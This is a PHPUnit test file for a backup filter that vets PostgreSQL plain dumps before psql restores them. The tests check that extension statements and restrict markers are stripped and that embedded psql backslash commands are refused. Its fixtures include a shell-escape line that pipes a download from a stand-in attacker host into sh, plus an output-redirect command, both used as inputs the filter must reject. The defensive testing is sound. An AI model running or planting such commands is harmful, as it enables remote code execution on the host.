<?php

namespace Tests\Unit;

use App\Core\Backups\Backups;
use RuntimeException;
use Tests\TestCase;

/**
 * What a plain SQL dump may hand psql (Backups::filterPlainDump).
 *
 * psql runs a backslash command it meets — `\! cmd` as the shop's own user —
 * and a backup is a file somebody else could have written to the bucket. So a
 * dump with a command in it is refused whole, while the backslashes pg_dump
 * does write (`\N` and `\.` inside COPY data, its `\restrict` markers) still
 * restore. No database and no psql: the filter is a function of two files.
 */
class PlainDumpFilterTest extends TestCase
{
    protected string $dir;

    protected function setUp(): void
    {
        parent::setUp();

        $this->dir = sys_get_temp_dir().DIRECTORY_SEPARATOR.'torgash-dump-'.bin2hex(random_bytes(4));
        mkdir($this->dir);
    }

    protected function tearDown(): void
    {
        foreach (glob($this->dir.DIRECTORY_SEPARATOR.'*') ?: [] as $file) {
            @unlink($file);
        }
        @rmdir($this->dir);

        parent::tearDown();
    }

    public function test_a_dump_as_pg_dump_writes_it_passes_with_its_extensions_taken_out(): void
    {
        $dump = implode("\n", [
            '\\restrict abc123',
            '--',
            "SET client_encoding = 'UTF8';",
            'CREATE EXTENSION IF NOT EXISTS pg_trgm WITH SCHEMA public;',
            "COMMENT ON EXTENSION pg_trgm IS 'text similarity';",
            'CREATE EXTENSION IF NOT EXISTS "uuid-ossp" WITH SCHEMA public;',
            'CREATE TABLE public.t (id integer, note text);',
            'COPY public.t (id, note) FROM stdin;',
            "1\t\\N",
            "\\N\tstarts with a null",
            "2\t\\! not a command inside copy data",
            '\\.',
            'DROP EXTENSION pg_trgm;',
            '\\unrestrict abc123',
            '',
        ]);

        $extensions = $this->filter($dump, $out);

        $this->assertSame(['pg_trgm'], $extensions, 'a quoted extension name is not matched by the plain pattern, as before');
        $this->assertStringNotContainsString('CREATE EXTENSION IF NOT EXISTS pg_trgm', $out);
        $this->assertStringNotContainsString('COMMENT ON EXTENSION', $out);
        $this->assertStringNotContainsString('DROP EXTENSION', $out);
        $this->assertStringNotContainsString('restrict abc123', $out, 'the dump\'s own markers are dropped');
        $this->assertStringContainsString("\\N\tstarts with a null\n", $out, 'COPY data is untouched');
        $this->assertStringContainsString("2\t\\! not a command inside copy data\n", $out);
        $this->assertStringContainsString("\\.\n", $out);
        $this->assertStringContainsString('CREATE TABLE public.t', $out);
        $this->assertStringStartsNotWith('\\restrict', $out, 'no key given, no marker written');
    }

    public function test_a_psql_command_outside_copy_data_refuses_the_whole_dump(): void
    {
        $dump = implode("\n", [
            'CREATE TABLE public.t (id integer);',
            '\\! curl https://evil.example/x | sh',
            'INSERT INTO public.t VALUES (1);',
            '',
        ]);

        try {
            $this->filter($dump, $out);
            $this->fail('a backslash command must not reach psql');
        } catch (RuntimeException $e) {
            $this->assertStringContainsString('line 2', $e->getMessage());
            $this->assertStringContainsString('\\! curl', $e->getMessage());
        }

        $this->assertFileDoesNotExist($this->dir.DIRECTORY_SEPARATOR.'restore.sql', 'nothing half-written is left for psql');
    }

    public function test_a_command_after_the_copy_block_has_ended_is_still_a_command(): void
    {
        $dump = implode("\n", [
            'COPY public.t (id) FROM stdin;',
            '1',
            '\\.',
            '\\o /tmp/owned',
            '',
        ]);

        $this->expectException(RuntimeException::class);
        $this->filter($dump, $out);
    }

    public function test_the_shops_own_restrict_markers_wrap_the_file_when_psql_knows_them(): void
    {
        $dump = "\\restrict theirs\nCREATE TABLE public.t (id integer);\n\\unrestrict theirs\n";

        $this->filter($dump, $out, 'ownkey0123');

        $this->assertStringStartsWith("\\restrict ownkey0123\n", $out);
        $this->assertStringEndsWith("\\unrestrict ownkey0123\n", $out);
        $this->assertStringNotContainsString('theirs', $out);
        $this->assertSame(1, substr_count($out, '\\restrict '));
    }

    /** @return list<string> */
    protected function filter(string $dump, ?string &$out, ?string $key = null): array
    {
        $from = $this->dir.DIRECTORY_SEPARATOR.'database.sql';
        $to = $this->dir.DIRECTORY_SEPARATOR.'restore.sql';
        file_put_contents($from, $dump);

        $extensions = Backups::filterPlainDump($from, $to, $key);
        $out = (string) file_get_contents($to);

        return $extensions;
    }
}
